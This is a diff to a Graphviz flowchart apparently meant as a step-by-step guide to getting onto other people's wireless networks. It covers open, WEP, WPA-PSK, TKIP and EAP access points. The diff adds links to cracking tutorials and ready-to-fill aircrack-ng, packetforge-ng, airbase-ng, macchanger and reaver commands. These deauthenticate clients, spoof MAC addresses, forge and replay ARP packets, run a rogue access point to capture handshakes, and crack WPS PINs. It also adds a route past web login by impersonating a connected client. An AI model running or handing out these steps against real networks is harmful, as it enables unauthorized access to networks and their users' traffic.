@@ -16,11 +16,14 @@ digraph Diagram {
     subgraph clusterMain {
         label = "Connecting Wireless-LAN Access Point";
         subgraph clusterFail {
-            node [shape=doublecircle];
+            label = "";
+            color = red;
+            node [shape=doublecircle,color=red];
             Impossible [label="BluteForceAttack? :D"];
         }
         subgraph clusterOPN{
             label = "OPN";
+            color = darkorchid;
             subgraph OPN_N_If {
                 node [shape=diamond];
                 NothingToDo [URL="http://compnetworking.about.com/od/wirelessfaqs/f/legal_free_wifi.htm"];
@@ -30,6 +33,7 @@ digraph Diagram {
         }
         subgraph clusterWEP {
             label = "WEP";
+            color = darkorchid1;
             subgraph WEP_N_Do {
                 node [shape=box];
                 ARPReplay [label="Perform ARP replay Attack",URL="http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection"];
@@ -41,7 +45,7 @@ digraph Diagram {
             subgraph WEP_N_If {
                 node [shape=diamond];
                 HasClient_WEP [label="HasClient"];
-                CouldGenerateXOR;
+                CouldGenerateXOR [URL="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients"];
             }
             subgraph WEP_Flow {
                 HasClient_WEP -> ARPReplay [label="Yes."];
@@ -56,6 +60,7 @@ digraph Diagram {
         }
         subgraph clusterWPA {
             label = "WPA";
+            color = darkorchid2;
             subgraph WPA_N_If {
                 node [shape=diamond];
                 IsTKIP;
@@ -66,7 +71,7 @@ digraph Diagram {
             subgraph WPA_Flow {
                 IsTKIP -> HasWPS_PSK [label="Yes."];
                 IsTKIP -> IsPSK [label="No."];
-                //IsTKIP -> KobeCrack [label="gain xor -> sniff and forge packets(do XOR each transaction)"]
+                //IsTKIP -> KobeCrack [label="gain xgr -> sniff and forge packets(do XOR each transaction)"];
                 IsPSK -> HasWPS_PSK [label="Yes."];
                 IsPSK -> HasClient_EAP [label="NO."];
             }
@@ -79,15 +84,15 @@ digraph Diagram {
                 }
                 subgraph PSK_N_Do {
                     node [shape=box];
-                    SetupRougeAccessPointOrDeauthClient [shape=record,label="SetupRougeAP|DeauthClient"];
-                    StealHandShake;
+                    SetupRougeAccessPointOrDeauthClient [shape=record,label="SetupRougeAP|DeauthClient",URL="http://theunl33t.blogspot.jp/2011/09/no-access-point-no-problem-how-to-get.html"];
+                    StealHandShake [URL="http://www.smallnetbuilder.com/wireless/wireless-howto/31914-how-to-crack-wpa-wpa2-2012"];
                     CrackCredential_PSK [label="CrackCredential"];
                     CrackWPS [URL="http://lifehacker.com/5873407/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver"];
                 }
                 subgraph PSK_Flow {
                     HasWPS_PSK -> IsWeakWPS [label="Yes."];
-                    IsWeakWPS -> CrackWPS [label="Yes."]
-                    IsWeakWPS -> HasClient_PSK [label="No."]
+                    IsWeakWPS -> CrackWPS [label="Yes."];
+                    IsWeakWPS -> HasClient_PSK [label="No."];
                     HasWPS_PSK -> HasClient_PSK [label="No."];
                     HasClient_PSK -> SetupRougeAccessPointOrDeauthClient [label="Yes."];
                     HasClient_PSK -> Impossible [label="No."];
@@ -103,24 +108,27 @@ digraph Diagram {
                 }
                 subgraph EAP_N_Do {
                     node [shape=box];
-                    SetupRougeAP;
-                    CaptureChallangeResponse;
+                    SetupRougeAP [URL="http://blog.opensecurityresearch.com/2012/04/capturing-and-cracking-peap.html"];
+                    CaptureChallangeResponse [URL="http://phreaklets.blogspot.jp/2013/06/cracking-wireless-networks-protected.html"];
                     CrackCredential_EAP [label="CrackCredential"];
                 }
                 subgraph EAP_Flow {
                     HasClient_EAP -> SetupRougeAP [label="Yes."];
-                    HasClient_EAP -> Impossible [label="No."]
+                    HasClient_EAP -> Impossible [label="No."];
                     SetupRougeAP -> CaptureChallangeResponse;
                     CaptureChallangeResponse -> CrackCredential_EAP;
                 }
             }
         }
+
+        NothingToDo -> IsTKIP -> HasClient_WEP [style=invis];
+
         subgraph N_Start {
-            node [shape=invtriangle];
+            node [shape=invtriangle,color=blue];
             Start;
         }
         subgraph N_End {
-            node [shape=triangle];
+            node [shape=triangle,color=blue];
             End;
             subgraph Impossible_to_End{
                 Impossible -> End;
@@ -131,8 +139,8 @@ digraph Diagram {
                 node [shape=box];
                 ImproveYourWifiAntenna [URL="http://www.instructables.com/id/DIY-WIFI-Antenna-Reception-Booster/"];
                 DeauthAllClient [URL="http://www.aircrack-ng.org/doku.php?id=deauthentication"];
-                SpoofHardwareAddress [URL="http://www.securethelock.com/2013/12/03/how-to-bypass-mac-address-filtering-using-backtrackkali-linux/"]
-                SpoofHardwareAddress2 [label="SpoofHardwareAddressToClient'sOne",URL="http://www.securethelock.com/2013/12/03/how-to-bypass-mac-address-filtering-using-backtrackkali-linux/"]
+                SpoofHardwareAddress [URL="http://www.securethelock.com/2013/12/03/how-to-bypass-mac-address-filtering-using-backtrackkali-linux/"];
+                SpoofHardwareAddress2 [label="SpoofHardwareAddressToClient'sOne",URL="http://www.securethelock.com/2013/12/03/how-to-bypass-mac-address-filtering-using-backtrackkali-linux/"];
             }
             subgraph N_If {
                 node [shape=diamond];
@@ -148,19 +156,19 @@ digraph Diagram {
             }
         }
         subgraph Flow {
-            Start -> HasAccessPointsAroundYou [label="Fine."];
-            HasAccessPointsAroundYou -> IsStealthESSID [label="Yes"]
+            Start -> HasAccessPointsAroundYou;
+            HasAccessPointsAroundYou -> IsStealthESSID [label="Yes"];
             HasAccessPointsAroundYou -> ImproveYourWifiAntenna [label="No."];
-            ImproveYourWifiAntenna -> IsStealthESSID [label="OK I got it."];
+            ImproveYourWifiAntenna -> IsStealthESSID;
             IsStealthESSID -> IsThereConnectedClient [label="Yes."];
             IsThereConnectedClient -> DeauthAllClient [label="Yes."];
-            IsThereConnectedClient -> IsThereConnectedClient [label="No."];
+            IsThereConnectedClient -> Impossible [label="No."];
             IsStealthESSID -> HasHardwareAddressFiltering [label="No."];
-            DeauthAllClient -> HasHardwareAddressFiltering [label="I got ESSID."]
-            HasHardwareAddressFiltering -> SpoofHardwareAddress [label="Yes."]
+            DeauthAllClient -> HasHardwareAddressFiltering;
+            HasHardwareAddressFiltering -> SpoofHardwareAddress [label="Yes."];
             HasHardwareAddressFiltering -> HasEncryption [label="No."];
-            SpoofHardwareAddress -> HasEncryption [label="I could associate with AP(or WEP-SKA."]
-            HasEncryption -> NothingToDo [label="No."]
+            SpoofHardwareAddress -> HasEncryption;
+            HasEncryption -> NothingToDo [label="No."];
             //goto clusterOPN
 
             HasEncryption -> IsWEP [label="Yes."];
@@ -179,11 +187,11 @@ digraph Diagram {
             CrackCredential_WEP -> HasWebAuthentication;
 
             HasWebAuthentication -> HasAccount [label="Yes."];
-            HasWebAuthentication -> HasClient_Web [label="No."]
+            HasWebAuthentication -> End [label="No."];
+            HasAccount -> End [label="Yes."];
+            HasAccount -> HasClient_Web [label="No."];
             HasClient_Web -> SpoofHardwareAddress2 [label="Yes."];
             HasClient_Web -> Impossible [label="No."];
-
-            HasAccount -> End;
             SpoofHardwareAddress2 -> End;
         }
     }
@@ -191,12 +199,18 @@ digraph Diagram {
     subgraph Commands {
         label = "CommandsAndNotes";
         subgraph Nt_Command {
-            node [shape=box];
+            node [shape=box,color=gray];
             HasAccessPointsAroundYouCommand [label="ifconfig wlan0 down;\niwconfig wlan0 mode mon || airmon-ng start wlan0;\nairodump-ng wlan0;\n"];
             ImproveYourWifiAntennaCommand [label="iw reg set BO;\niwconfig wlan0 tx 30;\n#Add DIY Parabora."];
-            IsStealthESSIDCommand [label="airodump-ng -c [channel] --bssid [AP MAC] wlan0"]
+            IsStealthESSIDCommand [label="airodump-ng -c [channel] --bssid [AP MAC] wlan0"];
             DeauthAllClientCommand [label="aireplay-ng -0 0 -a [AP MAC] wlan0;\naireplay-ng -0 0 -a [AP MAC] -c [STA MAC] wlan0;"];
-            SpoofHardwareAddressCommand [label="ifconfig wlan0 down && ifconfig hw ether [MAC] && ifconfig wlan0 up;\nmacchanger -m [MAC] wlan0;"]
+            SpoofHardwareAddressCommand [label="ifconfig wlan0 down && ifconfig hw ether [MAC] && ifconfig wlan0 up;\nmacchanger -m [MAC] wlan0;"];
+            CaptureSomeDataPacketCommand [label="airodump-ng -c [channel] --bssid [AP MAC] --output-format pcap -w captured wlan0"];
+            CouldGenerateXORCommand [label="aireplay-ng -5 -b [AP MAC] wlan0\naireplay-ng -4 -b [AP MAC] wlan0"];
+            ForgeARPCommand [label="packetforge-ng -0 -a [AP MAC] -h [Original client MAC of XOR] -k 255.255.255.255 -l 255.255.255.255 -y some.xor -w arp-req"];
+            ARPReplayCommand [label="aireplay-ng -3 -b [AP MAC] wlan0\naireplay-ng -2 -r arp-req wlan0"];
+            SetupRougeAccessPointOrDeauthClientCommand [label="airbase-ng -P -C 500 -Z 2 -c 1 -i mon0 -F handshakes.cap wlan0"];
+            CrackWPSCommand [label="reaver -i wlan0 -b [AP MAC]"];
         }
         subgraph Nt_Flow {
             edge [color=gray];
@@ -204,7 +218,16 @@ digraph Diagram {
             ImproveYourWifiAntennaCommand -> ImproveYourWifiAntenna;
             IsStealthESSIDCommand -> IsStealthESSID;
             DeauthAllClientCommand -> DeauthAllClient;
+            DeauthAllClientCommand -> SetupRougeAccessPointOrDeauthClient;
             SpoofHardwareAddressCommand -> SpoofHardwareAddress;
+            SpoofHardwareAddressCommand -> SpoofHardwareAddress2;
+            CaptureSomeDataPacketCommand -> CaptureSomeDataPacket;
+            CaptureSomeDataPacketCommand -> StealHandShake;
+            CouldGenerateXORCommand -> CouldGenerateXOR;
+            ForgeARPCommand -> ForgeARP;
+            ARPReplayCommand -> ARPReplay;
+            SetupRougeAccessPointOrDeauthClientCommand -> SetupRougeAccessPointOrDeauthClient;
+            CrackWPSCommand -> CrackWPS;
         }
     }
 /*
